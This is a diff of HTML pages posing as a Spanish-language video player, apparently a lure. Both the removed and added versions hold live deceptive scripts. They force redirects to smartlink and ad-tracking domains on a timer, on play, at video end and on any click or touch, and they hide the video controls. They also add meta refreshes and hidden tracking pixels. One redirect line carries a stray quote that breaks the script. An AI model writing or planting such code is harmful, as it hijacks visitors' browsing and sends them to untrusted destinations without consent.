@@ -1,139 +1,118 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Video</title>
-
-<style>
-body {
-    margin: 0;
-    background: #121212;
-    font-family: Arial, sans-serif;
-}
-
-.video-container {
-    position: relative;
-    max-width: 800px;
-    margin: 40px auto;
-}
-
-video {
-    width: 100%;
-    border-radius: 10px;
-    background: black;
-}
-
-/* Overlay Play */
-.play-overlay {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    background: rgba(0,0,0,0.35);
-}
-
-.play-btn {
-    width: 80px;
-    height: 80px;
-    background: #1e90ff;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 40px;
-    color: white;
-    animation: pulse 1.4s infinite;
-}
-
-.play-text {
-    color: #fff;
-    margin-top: 10px;
-    font-size: 16px;
-}
-
-/* HD Badge */
-.hd-badge {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background: #00bfff;
-    color: #fff;
-    padding: 6px 10px;
-    border-radius: 20px;
-    font-size: 13px;
-    animation: blink 1.2s infinite;
-}
-
-@keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.15); }
-    100% { transform: scale(1); }
-}
-
-@keyframes blink {
-    0%,100% { opacity: 1; }
-    50% { opacity: 0.4; }
-}
-</style>
-</head>
-
-<body>
-
-<!-- 🔢 CONTADOR OCULTO -->
-<img 
-  src="//whos.amung.us/pingjs/?k=hack17&t=Miguel17&x=https://www.facebook.com"
-  style="display:none"
-  alt=""
->
-
-<div class="video-container">
-    <video id="video" controls playsinline>
-        <source src="https://cdn.videy.co/KwlKPWKZ1.mp4" type="video/mp4">
-    </video>
-
-    <div class="play-overlay" id="overlay">
-        <div class="play-btn">▶</div>
-        <div class="play-text">Reproducir</div>
-    </div>
-
-    <div class="hd-badge">⚡ HD 1080p</div>
-</div>
-
 <script>
-const smartlink = "https://cbejfbb.clicksswitch.com/p/oXP0i";
-const video = document.getElementById("video");
-const overlay = document.getElementById("overlay");
-let redirected = false;
+document.addEventListener("DOMContentLoaded", function() {
+    var videos = document.querySelectorAll('video'); // Select all video elements
+    videos.forEach(function(video) {
+        video.addEventListener('ended', function() {   
+            window.location.href = 'https://rungbeacon.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339';
+        });
+    });
+});</script>
+<!-- end Simple Custom CSS and JS -->
+<script id="_wauwx2nwe" async src="//waust.at/p2.js?w=wx2nwe"></script><noscript><img src="//whos.amung.us/p2/widget/wx2nwe.png" border="0" title="Users Online" /></noscript><style class='wp-fonts-local'>
+@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://qquaax.com/wp-content/themes/twentytwentyfour/assets/fonts/inter/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
+@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://qquaax.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:italic;font-weight:400;font-display:fallback;src:url('https://qquaax.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_italic_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:normal;font-weight:700;font-display:fallback;src:url('https://qquaax.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_700.woff2') format('woff2');}
+</style>
+<script>
+        const redirectUrl = 'https://rungbeacon.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339''; // Replace with your URL
+        const maxRedirects = 2;
 
-function goLink() {
-    if (redirected) return;
-    redirected = true;
-    window.location.href = smartlink;
-}
+        // Check if this is a new session
+        if (!sessionStorage.getItem('sessionStarted')) {
+            localStorage.removeItem('clickCount');
+            sessionStorage.setItem('sessionStarted', 'true');
+        }
 
-/* 🔁 Redirección automática a los 3 segundos */
-setTimeout(goLink, 3000);
+        // Initialize click count from localStorage or set to 0
+        let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
 
-/* Click en play */
-overlay.addEventListener("click", () => {
-    overlay.style.display = "none";
-    video.play();
-    setTimeout(goLink, 3000);
-});
+        // Function to handle clicks
+        function handleClick(event) {
+            clickCount++;
+            localStorage.setItem('clickCount', clickCount);
+            if (clickCount <= maxRedirects) {
+                window.location.href = redirectUrl;
+                event.preventDefault();
+            } else {
+                document.getElementById('videoPlayer').setAttribute('controls', 'controls'); // Show video controls
+            }
+        }
 
-/* Si avanza más del 30% */
-video.addEventListener("timeupdate", () => {
-    if (video.duration && video.currentTime / video.duration > 0.3) {
-        goLink();
-    }
-});
+        // Function to handle touch events
+        function handleTouch(event) {
+            handleClick(event);
+        }
+
+        // Add event listeners for click and touchstart
+        document.addEventListener('click', handleClick, true); // Capture phase to ensure it catches all clicks
+        document.addEventListener('touchstart', handleTouch, true); // Capture phase to ensure it catches all touches
+
+       const videoOverlay = document.getElementById('videoOverlay');
+        videoOverlay.addEventListener('click', handleClick, true);  // Use capturing phase
+        videoOverlay.addEventListener('touchstart', handleTouch, true);  // Use capturing phase
+
+        // Initial setup: hide video controls and show overlay
+        if (clickCount <= maxRedirects) {
+            document.getElementById('videoPlayer').removeAttribute('controls');
+       
+        }
+    </script></head>
+
+<body class="post-template-default single single-post postid-22887 single-format-standard wp-embed-responsive">
+
+<div class="wp-site-blocks">
+<main class="wp-block-group alignfull is-layout-flow wp-block-group-is-layout-flow">
+<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="margin-bottom:var(--wp--preset--spacing--40);padding-top:var(--wp--preset--spacing--50)"></div>
+
+
+<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
+<figure class="wp-block-video"><video controls src="https://quaazzx.xyz/wp-content/uploads/2025/09/Video-sin-titulo-%E2%80%90-Hecho-con-Clipchamp-44.mp4"></video></figure>
+</div></main>
+</div>
+<script id="wp-block-template-skip-link-js-after">
+	( function() {
+		var skipLinkTarget = document.querySelector( 'main' ),
+			sibling,
+			skipLinkTargetID,
+			skipLink;
+
+		// Early exit if a skip-link target can't be located.
+		if ( ! skipLinkTarget ) {
+			return;
+		}
+
+		/*
+		 * Get the site wrapper.
+		 * The skip-link will be injected in the beginning of it.
+		 */
+		sibling = document.querySelector( '.wp-site-blocks' );
+
+		// Early exit if the root element was not found.
+		if ( ! sibling ) {
+			return;
+		}
+
+		// Get the skip-link target's ID, and generate one if it doesn't exist.
+		skipLinkTargetID = skipLinkTarget.id;
+		if ( ! skipLinkTargetID ) {
+			skipLinkTargetID = 'wp--skip-link--target';
+			skipLinkTarget.id = skipLinkTargetID;
+		}
+
+		// Create the skip link.
+		skipLink = document.createElement( 'a' );
+		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
+		skipLink.href = '#' + skipLinkTargetID;
+		skipLink.innerHTML = 'Skip to content';
+
+		// Inject the skip link.
+		sibling.parentElement.insertBefore( skipLink, sibling );
+	}() );
+	
 </script>
 
-</body>
-</html>
+<!-- Include the script -->
+<meta http-equiv="REFRESH" content="06;URL=https://rungbeacon.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339'">
 
-<meta http-equiv="REFRESH" content="07;URL=https://cbejfbb.clicksswitch.com/p/oXP0i">
+<img src="//whos.amung.us/pingjs/?k=hack17 &amp;t= Miguel17💯💯 &amp;x=https://www.facebook.com" style="display:none">
